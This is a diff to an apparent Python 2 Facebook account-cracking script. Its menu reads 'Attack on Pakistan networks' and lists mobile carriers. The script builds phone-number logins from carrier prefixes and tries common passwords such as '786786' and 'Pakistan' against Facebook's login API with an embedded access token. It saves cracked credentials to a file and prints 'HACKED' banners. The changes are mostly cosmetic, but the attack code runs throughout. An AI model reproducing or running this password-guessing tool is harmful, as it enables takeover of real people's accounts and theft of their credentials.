@@ -80,9 +80,7 @@ id = []
 def menu():
 	os.system('clear')
 	print logo
-	print "\033[1;97mCYBER_HACKER_GLAXY"
-	print "\033[1;97mRIGHT_HANDED_PLAYER"
-	print "\033[1;97mMOST_WELCOME_DEAR"
+	print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-Wellcome"
 	print
         print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
 	print "\033[1;92m[1]  MOBILINK"
@@ -205,7 +203,9 @@ def action():
 	time.sleep(0.5)
 	psb ('[✓] Please wait, process is running ...')
 	time.sleep(0.5)
-	psb ('[!] To Stop Process Press CTRL Then Press z')
+	psb ('[✓] Last 07 Digit Crack,786786,Pakistan Found ...')
+	time.sleep(0.5)
+	psb ('[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z')
 	time.sleep(0.5)
 	print 50*'-'
 	print
@@ -223,7 +223,7 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92mARBAB-HACKED\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"																				
+				print '\x1b[1;91mARBAB-HACKED\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
@@ -236,11 +236,11 @@ def action():
 					cps.close()
 					cpb.append(c+user+pass1)
 				else:	
-					pass2 = '786786'
+					pass2 = 'Pakistan'
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;92mARBAB-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"                            											
+		                        	print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
@@ -253,11 +253,11 @@ def action():
 							cps.close()
 							cpb.append(c+user+pass2)
 						else:	
-							pass3 = 'Pakistan'
+							pass3 = '786786'
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92mARBAB-HACKED\x1b[0m ' + k + c + user + ' | ' + pass3+'\n'+"\n"
+								print '\x1b[1;91mARBAB-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
